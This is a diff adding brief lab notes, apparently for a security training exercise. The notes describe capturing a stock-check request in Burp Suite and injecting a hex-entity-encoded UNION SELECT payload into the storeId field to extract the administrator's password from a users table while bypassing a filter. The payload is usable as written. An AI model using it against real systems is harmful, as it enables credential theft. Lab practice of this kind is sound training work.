@@ -1,0 +1,7 @@
+#Step 1: Install the hackvertor extension from burpsuite.
+
+#Step 2: Capture the stock request using burpsuite.
+
+#Step 3: Use union attack inside the 'storeId Tag' and encode the string using hackvertor 'hex_entities' :-
+
+<@hex_entities>1 UNION SELECT password from users where username='administrator'--<@/hex_entities>
